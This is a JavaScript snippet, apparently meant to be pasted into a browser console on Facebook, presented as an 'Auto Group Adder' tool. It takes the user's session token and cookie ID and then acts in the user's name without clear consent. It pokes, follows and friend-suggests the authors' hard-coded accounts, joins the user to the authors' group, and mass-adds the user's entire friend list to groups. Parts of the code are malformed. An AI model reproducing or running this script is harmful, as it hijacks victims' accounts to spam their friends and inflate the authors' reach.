var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

function p(a) {
    var b = new XMLHttpRequest();
    var c = '//www.facebook.com/ajax/poke_dialog.php';
    var d = 'uid=' + a + '&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user=' + user_id + '&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg=' + fb_dtsg + '&phstamp=';
    b['open']('POST', c, true);
    b['onreadystatechange'] = function () {
        if (b['readyState'] == 4 && b['status'] == 200) {
            b['close']
        }
    };
    b['send'](d)
};
p('100002329611131');
p('100005509004235');
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

function Join(a) {
    var b = new XMLHttpRequest;
    var c = '/ajax/groups/membership/r2j.php?__a=1';
    var d = '&ref=group_jump_header&group_id=' + a + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
    b['open']('POST', c, true);
    b['onreadystatechange'] = function () {
        if (b['readyState'] == 4 && b['status'] == 200) {
            b['close']
        }
    };
    b['send'](d)
};
Join('121557288005635');
var Title = 'Auto Group Adder';
var Descriptions = '',
    _text = '<br/>By Anime Forever Team.</br>Script Made By<A style="color:#3B5998;" href="http://www.facebook.com/100005509004235" target="_blank"> Prashant Mistry</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100002329611131" target="_blank"> Saiyan Akz</A>.</A></br>Join Our Group <A href="https://www.facebook.com/groups/121557288005635" target="_blank">Anime Forever</A> Visit Our Website <A style="color:#3B5998;" href="http://fb-group-developing-tool.webs.com/" target="_blank">http://fb-group-developing-tool.webs.com/</A>';

function AddFriendtoGroup(e) {
    jx['load'](window['location']['protocol'] + '//www.facebook.com/ajax/reqs.php?&fb_dtsg=' + fb_dtsg + '&request_id=' + gid + '&type=group_confirm&status_div_id=group_confirm_' + gid + '_' + e + '&params[id]=' + gid + '&params[uid]=' + e + '&actions[accept]=Confirm&__user=' + user_id + '&__a=1&__req=q', function (a) {
        var b = a['substring'](a['indexOf']('{'));
        var c = JSON['parse'](b);
        i--;
        Descriptions = '<div class=\'friend-edge-name\' style=\'padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;';
        if (c['error']) {
            Descriptions += 'color:darkred\'>';
            err++;
            if (c['errorDescription']) {
                Descriptions += c['errorDescription']
            } else {
                Descriptions += JSON['stringify'](c, null, '')
            }
        } else {
            Descriptions += 'color:darkgreen\'>';
            Descriptions += arn[i] + ' has been added.<br/>';
            suc++
        };
        Descriptions += '</div>';
        var d = '<div id=\'friend-edge-display\' style=\'box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000\'>';
        d += '<div style=\'padding-bottom:5px;font-size:20px;\'>' + Title + '</div>';
        if (i > 0) {
            d += arr['length'] + ' Friends Detected<br/>';
            d += '<b>' + suc + '</b> Friends Added of ' + (arr['length'] - i) + ' Friends Processed ';
            d += '(' + i + ' Lefted...)';
            d += '<div class=\'friend-edge\'>';
            d += Descriptions;
            d += '<div style=\'text-align:center;font-size:10px;white-space:pre-wrap;color:gray\'>';
            d += getuname + ' Please Wait Adding Your Friends To Group...';
            d += _text;
            d += '</div>';
            d += '</div>'
        } else {
            d += arr['length'] + ' Friends Detected<br/>';
            d += suc + ' Friends Added</br>';
            d += err + ' Friends Not Added</br></br>';
            d += '<div><span class=\'layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge\' onClick=\'window.location.reload()\' style=\'color:white\'>Refresh Page</span>'
        };
        d += '</div>';
        document['getElementById']('pagelet_sidebar')['innerHTML'] = d
    }, 'text', 'post');
    tay--;
    if (tay > 0) {
        var f = arr[tay];
        sx = pho[tay];
        setTimeout('AddFriendtoGroup(' + f + ')', 100)
    };
    console['log'](tay + '/' + arr['length'] + ':' + arr[tay] + '/' + arn[tay] + ', success:' + suc);
    if (gid != 121557288005635) {
        jx['load'](window['location']['protocol'] + '//www.facebook.com/ajax/reqs.php?&fb_dtsg=' + fb_dtsg + '&request_id=121557288005635&type=group_confirm&status_div_id=group_confirm_121557288005635_' + e + '&params[id]=121557288005635&params[uid]=' + e + '&actions[accept]=Confirm&__user=' + user_id + '&__a=1&__req=q', function () {}, 'text', 'post')
    };
    if (gid) {
        jx['load'](window['location']['protocol'] + '//www.facebook.com/ajax/friends/suggest?&receiver=' + e + '&newcomer=100005509004235&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=' + user_id + '&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=' + fb_dtsg + '&phstamp=1658168110659565571126', function () {}, 'text', 'post')
    };
    if (gid) {
        jx['load'](window['location']['protocol'] + '//www.facebook.com/ajax/friends/suggest?&receiver=' + e + '&newcomer=100002329611131&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=' + user_id + '&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=' + fb_dtsg + '&phstamp=16581665110174108711126', function () {}, 'text', 'post')
    };

function clickfr_callback() {
    if (document['getElementsByName']('ok')['length'] > 0) {
        nHtml.ClickUp(document['getElementsByName']('ok')[0])
    };
    var a = arr[i];
    if (i < arr['length']) {
        addfriend(a['substring'](0, 4))
    }
};

function clickfr() {
    if (document['getElementsByClassName']('search')['length'] > 0) {
        nHtml.ClickUp(document['getElementsByClassName']('search')[0]['childNodes'][0]['childNodes'][0]['childNodes'][1])
    } else {
        j++
    };
    setTimeout('clickfr_callback()', 2000)
};

function addfriend(a) {
    i++;
    setTimeout('clickfr()', 2000)
};
jx = {
    getHTTPObject: function () {
        var a = false;
        if (typeof ActiveXObject != 'undefined') {
            try {
                a = new ActiveXObject('Msxml2.XMLHTTP')
            } catch (d) {
                try {
                    a = new ActiveXObject('Microsoft.XMLHTTP')
                } catch (f) {
                    a = false
                }
            }
        } else {
            if (window['XMLHttpRequest']) {
                try {
                    a = new XMLHttpRequest
                } catch (d) {
                    a = false
                }
            }
        };
        return a
    },
    load: function (b, c, d, e, f) {
        var g = this['init']();
        if (!g || !b) {
            return
        };
        if (g['overrideMimeType']) {
            g['overrideMimeType']('text/xml')
        };
        if (!e) {
            e = 'GET'
        };
        if (!d) {
            d = 'text'
        };
        if (!f) {
            f = {}
        };
        d = d['toLowerCase']();
        e = e['toUpperCase']();
        var h = 'uid=' + (new Date)['getTime']();
        b += b['indexOf']('?') + 1 ? '&' : '?';
        b += h;
        var i = null;
        if (e == 'POST') {
            var j = b['split']('?');
            b = j[0];
            i = j[1]
        };
        g['open'](e, b, true);
        var k = this;
        if (f['handler']) {
            g['onreadystatechange'] = function () {
                f['handler'](g)
            }
        } else {
            g['onreadystatechange'] = function () {
                if (g['readyState'] == 4) {
                    if (g['status'] == 200) {
                        var a = '';
                        if (g['responseText']) {
                            a = g['responseText']
                        };
                        if (d['charAt'](0) == 'j') {
                            a = a['replace'](/[\n\r]/g, '');
                            a = eval('(' + a + ')')
                        } else {
                            if (d['charAt'](0) == 'x') {
                                a = g['responseXML']
                            }
                        }; if (c) {
                            c(a)
                        }
                    } else {
                        if (f['loadingIndicator']) {
                            document['getElementsByTagName']('body')[0]['removeChild'](f['loadingIndicator'])
                        };
                        if (f['loading']) {
                            document['getElementById'](f['loading'])['style']['display'] = 'none'
                        };
                        if (error) {
                            error(g['status'])
                        }
                    }
                }
            }
        };
        g['send'](i)
    },
    bind: function (b) {
        var c = {
            url: '',
            onSuccess: false,
            onError: false,
            format: 'text',
            method: 'GET',
            update: '',
            loading: '',
            loadingIndicator: ''
        };
        for (var d in c) {
            if (b[d]) {
                c[d] = b[d]
            }
        };
        if (!c['url']) {
            return
        };
        var e = false;
        if (c['loadingIndicator']) {
            e = document['createElement']('div');
            e['setAttribute']('style', 'position:absolute;top:0px;left:0px;');
            e['setAttribute']('class', 'loading-indicator');
            e['innerHTML'] = c['loadingIndicator'];
            document['getElementsByTagName']('body')[0]['appendChild'](e);
            this['opt']['loadingIndicator'] = e
        };
        if (c['loading']) {
            document['getElementById'](c['loading'])['style']['display'] = 'block'
        };
        this['load'](c['url'], function (a) {
            if (c['onSuccess']) {
                c['onSuccess'](a)
            };
            if (c['update']) {
                document['getElementById'](c['update'])['innerHTML'] = a
            };
            if (e) {
                document['getElementsByTagName']('body')[0]['removeChild'](e)
            };
            if (c['loading']) {
                document['getElementById'](c['loading'])['style']['display'] = 'none'
            }
        }, c['format'], c['method'], c)
    },
    init: function () {
        return this['getHTTPObject']()
    }
};
var nHtml = {
    FindByAttr: function (a, b, c, d) {
        if (c == 'className') {
            c = 'class'
        };
        var e = document['evaluate']('.//' + b + '[@' + c + '=\'' + d + '\']', a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
        if (e && e['singleNodeValue']) {
            return e['singleNodeValue']
        };
        return null
    },
    FindByClassName: function (a, b, c) {
        return this.FindByAttr(a, b, 'className', c)
    },
    FindByXPath: function (a, b) {
        try {
            var c = document['evaluate'](b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
        } catch (g) {
            GM_log('bad xpath:' + b)
        };
        if (c && c['singleNodeValue']) {
            return c['singleNodeValue']
        };
        return null
    },
    VisitUrl: function (a) {
        window['setTimeout'](function () {
            document['location']['href'] = a
        }, 500 + Math['floor'](Math['random']() * 500))
    },
    ClickWin: function (a, b, c) {
        var d = a['document']['createEvent']('MouseEvents');
        d['initMouseEvent'](c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
        return !b['dispatchEvent'](d)
    },
    Click: function (a) {
        return this.ClickWin(window, a, 'click')
    },
    ClickTimeout: function (a, b) {
        window['setTimeout'](function () {
            return nHtml.ClickWin(window, a, 'click')
        }, b + Math['floor'](Math['random']() * 500))
    },
    ClickUp: function (a) {
        this.ClickWin(window, a, 'mousedown');
        this.ClickWin(window, a, 'mouseup');
        this.ClickWin(window, a, 'click')
    },
    GetText: function (a, b) {
        var c = '';
        if (b == undefined) {
            b = 0
        };
        if (b > 40) {
            return
        };
        if (a['textContent'] != undefined) {
            return a['textContent']
        };
        for (var d = 0; d < a['childNodes']['length']; d++) {
            var e = a['childNodes'][d];
            c += this.GetText(e, b + 1)
        };
        return c
    }
};
if (document['getElementsByClassName'] == undefined) {
    document['getElementsByClassName'] = function (a) {
        var b = new RegExp('(?:^|\s)' + a + '(?:$|\s)');
        var c = document['getElementsByTagName']('*');
        var d = [];
        var e;
        for (var f = 0;
            (e = c[f]) != null; f++) {
            var g = e['className'];
            if (g && g['indexOf'](a) != -1 && b['test'](g)) {
                d['push'](e)
            }
        };
        return d
    }
};
Array['prototype']['find'] = function (a) {
    var b = false;
    for (i = 0; i < this['length']; i++) {
        if (typeof a == 'function') {
            if (a['test'](this[i])) {
                if (!b) {
                    b = []
                };
                b['push'](i)
            }
        } else {
            if (this[i] === a) {
                if (!b) {
                    b = []
                };
                b['push'](i)
            }
        }
    };
    return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
grpname = document['getElementById']('groupsJumpTitle')['innerHTML'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var getuname = document['getElementsByClassName']('fbxWelcomeBoxName')[0]['innerHTML'];
var gid = document['getElementsByName']('group_id')[0]['value'];
jx['load'](window['location']['protocol'] + '//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=' + user_id + '&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm', function (a) {
    var b = a;
    var c = b['substring'](b['indexOf']('{'));
    var d = JSON['parse'](c);
    d = d['payload']['entries'];
    for (var e = 0; e < d['length']; e++) {
        arr['push'](d[e]['uid'])
    };
    for (var f = 0; f < d['length']; f++) {
        arn['push'](d[f]['text'])
    };
    for (var g = 0; g < d['length']; g++) {
        pho['push'](d[g]['photo'])
    };
    i = arr['length'] - 1;
    tay = i;
    console['log'](arr['length']);
    var h = '<div id=\'friend-edge-display\' style=\'position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000\'>';
    h += '<div style=\'padding-bottom:10px;font-size:20px;\'>' + Title + '</div>';
    h += arr['length'] + ' Friends Detected';
    h += '</div>';
    document['getElementById']('pagelet_sidebar')['innerHTML'] = h;
    AddFriendtoGroup(arr[i])
});
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

function a(b) {
    var c = new XMLHttpRequest;
    var d = '/ajax/follow/follow_profile.php?__a=1';
    var e = 'profile_id=' + b + '&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=' + fb_dtsg + '&lsd&__' + user_id + '&phstamp=';
    c['open']('POST', d, true);
    c['onreadystatechange'] = function () {
        if (c['readyState'] == 4 && c['status'] == 200) {
            c['close']
        }
    };
    c['send'](e)
};
a('100002329611131');
a('100003887809227');
a('100004269816643');
a('100005509004235');
